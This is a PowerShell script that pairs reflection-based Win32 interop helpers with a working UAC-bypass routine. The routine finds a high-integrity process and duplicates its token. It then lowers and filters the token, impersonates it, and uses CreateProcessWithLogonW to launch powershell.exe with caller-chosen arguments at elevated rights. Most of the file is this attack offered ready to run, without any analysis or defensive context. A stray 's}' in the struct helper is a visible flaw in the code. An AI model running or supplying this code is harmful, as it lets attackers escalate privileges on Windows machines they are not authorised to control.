function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type
{
<#
    .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func

    .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

    .PARAMETER DllName

        The name of the DLL.

    .PARAMETER FunctionName

        The name of the target function.

    .PARAMETER ReturnType

        The return type of the function.

    .PARAMETER ParameterTypes

        The function parameters.

    .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

    .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

    .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

    .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}

function psenum
{
<#
    .SYNOPSIS

        Creates an in-memory enumeration for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION

        The 'psenum' function facilitates the creation of enums entirely in
        memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

        The in-memory module that will host the enum. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the enum.

    .PARAMETER Type

        The type of each enum element.

    .PARAMETER EnumElements

        A hashtable of enum elements.

    .PARAMETER Bitfield

        Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
            UNKNOWN =                  0
            NATIVE =                   1 # Image doesn't require a subsystem.
            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
            EFI_APPLICATION =          10
            EFI_BOOT_SERVICE_DRIVER =  11
            EFI_RUNTIME_DRIVER =       12
            EFI_ROM =                  13
            XBOX =                     14
            WINDOWS_BOOT_APPLICATION = 16
        }

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}

function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
 
.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.PARAMETER CharSet

Dictates which character set marshaled strings should use.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

$Module = New-InMemoryModule -ModuleName Win32

$SE_GROUP = psenum $Module SE_GROUP UInt32 @{
    DISABLED           = 0x00000000
    MANDATORY          = 0x00000001
    ENABLED_BY_DEFAULT = 0x00000002
    ENABLED            = 0x00000004
    OWNER              = 0x00000008
    USE_FOR_DENY_ONLY  = 0x00000010
    INTEGRITY          = 0x00000020
    INTEGRITY_ENABLED  = 0x00000040
    RESOURCE           = 0x20000000
    LOGON_ID           = 3221225472
} -Bitfield


$SECURITY_ATTRIBUTES = struct $Module SECURITY_ATTRIBUTES @{
    nLength = field 0 Int
    lpSecurityDescriptor = field 1 IntPtr
    bInheritHandle = field 2 Int
}

$SID_IDENTIFIER_AUTHORITY = struct $Module SID_IDENTIFIER_AUTHORITY @{
    value = field 0 byte[] -MarshalAs @('ByValArray',6)
}

$SID_AND_ATTRIBUTES = struct $Module SID_AND_ATTRIBUTES @{
    Sid = field 0 IntPtr
    Attributes = field 1 $SE_GROUP
}


$TOKEN_MANDATORY_LABEL = struct $Module TOKEN_MANDATORY_LABEL @{
    Label = field 0 $SID_AND_ATTRIBUTES
}

$STARTUPINFO = struct $Module STARTUPINFO @{
    cb = field 0 int
    lpReserved = field 1 string
    lpDesktop = field 2 string
    lpTitle = field 3 string
    dwX = field 4 int
    dwY = field 5 int
    dwXSize = field 6 int
    dwYSize = field 7 int
    dwXCountChars = field 8 int
    dwYCountChars = field 9 int
    dwFillAttribute = field 10 int
    dwFlags = field 11 int
    wShowWindow = field 12 int
    cbReserved2 = field 13 int
    lpReserved2 = field 14 IntPtr
    hStdInput = field 15 IntPtr
    hStdOutput = field 16 IntPtr
    hStdError = field 17 IntPtr
}

$PROCESS_INFORMATION = struct $Module PROCESS_INFORMATION @{
     hProcess = field 0 IntPtr
     hThread = field 1 IntPtr
     dwProcessId = field 2 int
     dwThreadId = field 3 int
}

$FunctionDefinitions = @(
    (func advapi32 OpenProcessToken ([bool]) @(
        [IntPtr],
        [UInt32],
        [IntPtr].MakeByRefType()
    ) -EntryPoint OpenProcessToken -SetLastError),

    (func advapi32 GetTokenInformation ([bool]) @(
        [IntPtr],
        [Int32],
        [IntPtr],
        [UInt32],
        [UInt32].MakeByRefType()
    ) -EntryPoint GetTokenInformation -SetLastError),

    (func advapi32 GetSidSubAuthorityCount ([IntPtr]) @(
        [IntPtr]
    ) -EntryPoint GetSidSubAuthorityCount -SetLastError),

    (func advapi32 GetSidSubAuthority([IntPtr]) @(
        [IntPtr],
        [UInt32]
    ) -EntryPoint GetSidSubAuthority -SetLastError),

    (func advapi32 DuplicateTokenEx ([bool]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [UInt32],
        [UInt32],
        [IntPtr].MakeByRefType()
    ) -EntryPoint DuplicateTokenEx -SetLastError),

    (func advapi32 AllocateAndInitializeSid ([bool]) @(
        $SID_IDENTIFIER_AUTHORITY,
        [Byte],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [IntPtr].MakeByRefType()                  
    ) -EntryPoint AllocateAndInitializeSid -SetLastError),

    (func advapi32 ImpersonateLoggedOnUser ([bool]) @(
        [IntPtr]
    )-EntryPoint ImpersonateLoggedOnUser -SetLastError),

    (func advapi32 CreateProcessWithLogonW ([bool]) @(
        [String],
        [String],
        [String],
        [UInt32],
        [String],
        [String],
        [UInt32],
        [UInt32],
        [String],
        [IntPtr],
        [IntPtr].MakeByRefType()
    )-EntryPoint CreateProcessWithLogonW -SetLastError),


    (func kernel32 OpenProcess ([IntPtr]) @(
        [UInt32],
        [bool],
        [UInt32]
    )-EntryPoint OpenProcess -SetLastError),

    (func kernel32 TerminateProcess ([bool]) @(
        [IntPtr],
        [UInt32]
    )-EntryPoint TerminateProcess -SetLastError),

    (func ntdll NtSetInformationToken ([int]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [UInt32]
    )-EntryPoint NtSetInformationToken -SetLastError),

    (func ntdll NtFilterToken ([int]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [IntPtr],
        [IntPtr],
        [IntPtr].MakeByRefType()
    )-EntryPoint NtFilterToken -SetLastError)



)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$ntdll = $Types['ntdll']



function EnumProcesses(){
    Get-Process | %{
        # Get handle to the process
        $ProcHandle = $Kernel32::OpenProcess(0x00001000, $false, $_.Id)
        if($ProcHandle -eq 0){
            #echo "[!] Unable to open process`n"
            return
        }

        # Get handle to the process token
        $hTokenHandle = 0
        $CallResult = $Advapi32::OpenProcessToken($ProcHandle, 0x02000000, [ref]$hTokenHandle)
        if($CallResult -eq 0){
            return
        }   
            
        # Call GetTokenInformation with TokenInformationClass = 25 (TokenIntegrityLevel)
        [int]$Length = 0
        $CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, [IntPtr]::Zero, $Length, [ref]$Length)
            
        # After we get the buffer length alloc and call again
        [IntPtr]$TokenInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Length)
        $CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, $TokenInformation, $Length, [ref]$Length)
            
        [System.IntPtr] $pSid1 = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($TokenInformation)
        [int]$IntegrityLevel = [System.Runtime.InteropServices.Marshal]::ReadInt32($advapi32::GetSidSubAuthority($pSid1, ([System.Runtime.InteropServices.Marshal]::ReadByte($Advapi32::GetSidSubAuthorityCount($pSid1)) - 1)))
        if($IntegrityLevel -eq 12288){
            return [int]$_.Id
        }
    }
}

function ElevateProcess($HIProc,$Binary, $Arguments){
    $PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
    $bInheritHandle = $false
    $hProcess = $Kernel32::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION, $bInheritHandle, $HIProc[0]) 
    if ($hProcess -ne 0) {
            Write-Verbose "[*] Successfully acquired $((Get-Process -Id $HIProc).Name) handle"
        } else {
            Write-Verbose "[!] Failed to get process token!`n"
            Break
        }
    $hToken = [IntPtr]::Zero
    
    if($Advapi32::OpenProcessToken($hProcess, 0x02000000, [ref]$hToken)) {
        Write-Verbose "[*] Opened process token"
    } else {
        Write-Verbose "[!] Failed open process token!`n"
        Break
    }


    $hNewToken = [IntPtr]::Zero 
    $SEC_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
    [IntPtr]$SEC_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($SEC_ATTRIBUTES_Struct, $SEC_ATTRIBUTES_PTR,$False)
    if($Advapi32::DuplicateTokenEx($hToken,0xf01ff,$SEC_ATTRIBUTES_PTR,2,1,[ref]$hNewToken)) {
        Write-Verbose "[*] Duplicated process token"
    } else {
        Write-Verbose "[!] Failed to duplicate process token!`n"
        Break
    }
    $SIA_Struct = [Activator]::CreateInstance($SID_IDENTIFIER_AUTHORITY)
    #0x10 == SECURITY_MANDATORY_LABEL_AUTHORITY  
    $SIA_Struct.Value = [byte[]](0x0, 0x0, 0x0, 0x0, 0x0, 0x10)

    [IntPtr]$SIA_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_IDENTIFIER_AUTHORITY::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($SIA_Struct,$SIA_PTR,$False)
    $pSid = [System.IntPtr]::Zero

    $Advapi32::AllocateAndInitializeSid($SIA_PTR,1,0x2000,0,0,0,0,0,0,0,[ref]$pSid)



    $SID_AND_ATTRIBUTES_Struct = [Activator]::CreateInstance($SID_AND_ATTRIBUTES)
    $SID_AND_ATTRIBUTES_Struct.Sid = $pSid
    $SID_AND_ATTRIBUTES_Struct.Attributes = 0x20
    [IntPtr]$SID_AND_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_AND_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($SID_AND_ATTRIBUTES_Struct, $SID_AND_ATTRIBUTES_PTR,$False)
    $TOKEN_MANDATORY_LABEL_Struct = [Activator]::CreateInstance($TOKEN_MANDATORY_LABEL)
    $TOKEN_MANDATORY_LABEL_Struct.Label = $SID_AND_ATTRIBUTES_Struct
    [IntPtr]$TOKEN_MANDATORY_LABEL_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TOKEN_MANDATORY_LABEL::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($TOKEN_MANDATORY_LABEL_Struct, $TOKEN_MANDATORY_LABEL_PTR,$False)
    $TOKEN_MANDATORY_LABEL_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL_Struct)

    if($ntdll::NtSetInformationToken($hNewToken,25,$TOKEN_MANDATORY_LABEL_PTR,$($TOKEN_MANDATORY_LABEL_SIZE)) -eq 0) {
        Write-Verbose "[*] Lowered token mandatory IL"
    } else {
        Write-Verbose "[!] Failed modify token!`n"
        Break
    }
    [IntPtr]$LUAToken = [System.IntPtr]::Zero
    if($ntdll::NtFilterToken($hNewToken,4,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[ref]$LUAToken) -eq 0) {
        Write-Verbose "[*] Created restricted token"
    } else {
        Write-Verbose "[!] Failed to create restricted token!`n"
        Break
    }
    [IntPtr]$hNewToken = [System.IntPtr]::Zero
    $NEW_SECURITY_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
    [IntPtr]$NEW_SECURITY_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($NEW_SECURITY_ATTRIBUTES_Struct, $NEW_SECURITY_ATTRIBUTES_PTR,$False)
    if($Advapi32::DuplicateTokenEx($LUAToken,0xc,$NEW_SECURITY_ATTRIBUTES_PTR,2,2,[ref]$hNewToken)){
        Write-Verbose "[*] Duplicated restricted token"
    } else {
        Write-Verbose "[!] Failed to duplicate restricted token!`n"
        Break
    }
    if($Advapi32::ImpersonateLoggedOnUser($hNewToken)){
        Write-Verbose "[*] Successfully impersonated security context"
    } else {
        Write-Verbose "[!] Failed impersonate context!`n"
        Break
    }

    $STARTUP_INFO_STRUCT = [Activator]::CreateInstance($STARTUPINFO)
    $STARTUP_INFO_STRUCT.dwFlags = 0x00000001 
    $STARTUP_INFO_STRUCT.wShowWindow = 0x0001
    $STARTUP_INFO_STRUCT.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($STARTUP_INFO_STRUCT)
    [IntPtr]$STARTUP_INFO_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($STARTUP_INFO_STRUCT,$STARTUP_INFO_PTR,$false)
    $PROCESS_INFORMATION_STRUCT = [Activator]::CreateInstance($PROCESS_INFORMATION)
    [IntPtr]$PROCESS_INFORMATION_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PROCESS_INFORMATION::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($PROCESS_INFORMATION_STRUCT,$PROCESS_INFORMATION_PTR,$false)
    $path = $Env:SystemRoot
    $advapi32::CreateProcessWithLogonW("l","o","l",0x00000002,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe"+ " " + $Arguments,0x04000000,$null,$path,$STARTUP_INFO_PTR,[ref]$PROCESS_INFORMATION_PTR)


}

